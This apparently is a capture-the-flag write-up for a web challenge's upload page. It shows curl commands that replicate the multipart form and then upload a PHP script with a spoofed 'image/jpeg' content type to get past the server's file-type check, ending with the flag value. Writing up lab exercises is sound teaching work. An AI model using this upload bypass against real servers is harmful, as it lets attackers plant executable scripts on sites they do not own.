# upload

We go to `?page=upload`. We see a file input, and an `Upload` button.

We upload a JPEG and see what happens. It seems to have uploaded. We inspect the Network tab and determine the following :

- The `Upload` button initiates a POST request
- The content is a three-part `multipart/form-data`
- The first part is a key-value pair : `MAX_FILE_SIZE` = `100000`
- The second part is a file content pair : `uploaded` = `[The contents of the file we uploaded]`
- The third part is a key-value pair : `Upload` = `Upload`

`curl` can send `multipart/form-data` requests, using the following syntax :

```
curl -X POST -F "key=value" -F "file=@path_to_file TARGET_URL"
```

We start by replicating the page's behaviour :

```
curl -X POST -F "MAX_FILE_SIZE=100000" -F "uploaded=@flower.jpg" -F "Upload=Upload" http://DARKLY_URL/index.php?page=upload
```

When we run it, the file uploads.

Now, we want to upload something else ; a malicious script, for example. We try to upload `script.php` instead of the jpeg, but the server rejects it ; it must check file type.

Fortunately, `curl` allows us to specify the file type of our multipart request using `-F "file=@path_to_file;type=SPECIFIED_TYPE"`.

We run the following command to send a spoofed request :

```
curl -i -X POST -F "MAX_FILE_SIZE=100000" -F "uploaded=@script.php;type=image/jpeg" -F "Upload=Upload" http://DARKLY_URL/index.php?page=upload
```

It works ! We get the flag :

```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```